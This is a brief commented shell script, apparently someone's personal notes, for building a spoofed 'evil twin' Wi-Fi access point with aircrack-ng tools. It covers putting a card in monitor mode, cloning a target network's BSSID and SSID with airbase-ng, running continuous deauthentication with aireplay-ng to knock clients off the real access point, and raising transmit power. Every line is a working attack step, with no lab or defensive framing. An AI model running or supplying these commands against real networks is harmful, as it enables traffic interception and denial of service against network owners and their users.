# Set up a manual spoofed evil twin AP
# Start out wifi card in monitor mode 
airmon-ng start {Interface name}
# Get our new nic name
ifconfig
# Start capturing on our new interface
airodump-ng {New interface name}
# Create a new fake AP, open a new terminal
airbase-ng -a {Bssid of target} --essid "{SSID of target}" -c 11 {interface}
# Bump the target off there original AP
aireplay-ng wlan1mon --deauth 0 -a {BSSID}
# Turn up our WIFI power on original interface!
iwconfig wlan0 txpower 27